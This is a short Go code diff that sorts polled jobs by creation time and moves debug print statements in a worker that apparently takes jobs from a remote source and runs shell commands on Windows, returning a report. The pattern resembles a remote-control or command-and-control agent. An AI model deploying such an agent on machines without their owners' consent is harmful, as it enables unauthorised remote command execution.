@@ -139,8 +139,10 @@ func (w *Worker) poll() {
 			goto end
 		}
 		// TODO: sort jobs by create time
+		if len(jobs) > 1 {
+			sortJobsByTime(jobs)
+		}
 		for _, j := range jobs {
-			fmt.Println(j.Todo)
 			w.resolve(j)
 		}
 	end:
@@ -154,6 +156,8 @@ func (w *Worker) poll() {
 
 func (w *Worker) resolve(job Job) {
 	todo, args := parseJob(job.Todo)
+	fmt.Println(job.Todo)
+	fmt.Println(job.Created)
 	switch todo {
 	case SHELL_CMD:
 		output, _ := win.ExecuteCommand(args...) // TODO: check for errors and send error message as report
